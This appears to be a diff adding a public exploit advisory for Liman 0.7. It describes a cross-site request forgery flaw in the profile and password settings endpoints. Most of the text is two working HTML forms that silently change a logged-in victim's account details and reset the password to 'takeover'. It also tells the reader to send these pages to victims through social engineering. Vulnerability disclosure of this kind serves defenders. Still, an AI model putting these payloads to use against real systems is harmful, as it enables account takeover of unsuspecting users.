@@ -1,0 +1,64 @@
+# Exploit Title: Liman 0.7 - Cross-Site Request Forgery (Change Password)
+# Date: 2020-10-07
+# Exploit Author: George Tsimpidas
+# Software Link : https://github.com/salihciftci/liman/releases/tag/v0.7
+# Version: 0.7
+# Tested on: Ubuntu 18.04.5 LTS (Bionic Beaver)
+# Category: Webapp
+
+Description:
+
+There is no CSRF protection in Liman application, with a little help
+of social engineering (like sending a link via email/chat) an attacker may
+force the victim to click on a malicious link, with the purpose of
+manipulating his current account information, or changing entirely his
+password.
+
+Vulnerable Endpoints :
+
+http://127.0.0.1:5000/settings/profile
+http://127.0.0.1:5000/settings/password
+
+Proof of Concept
+
+
+Download the application, make an account and login inside the
+panel under : http://127.0.0.1:5000 expose the docker port on 5000.
+
+
+Save this .html files and send it to victim (Victim should be
+logged in in the browser)
+
+Crafted value will be added.
+
+Account Information CSRF :
+
+<html>
+<body>
+
+<script>history.pushState('', '', '/')</script>
+<form action="http://127.0.0.1:5000/settings/profile" method="POST">
+<input type="hidden" name="username" value="betatest" />
+<input type="hidden" name="email" value="test@gmail.com" />
+<input type="submit" value="TakeOver Account Settings" />
+
+</body>
+</html>
+
+
+Password Change CSRF :
+
+<html>
+<body>
+
+<script>history.pushState('', '', '/')</script>
+<form action="http://127.0.0.1:5000/settings/password" method="POST">
+<input type="hidden" name="password" value="takeover" />
+<input type="hidden" name="newPassword" value="takeover" />
+<input type="hidden" name="confirmPassword" value="takeover" />
+<input type="submit" value="Password TakeOver" />
+
+
+
+</body>
+</html>
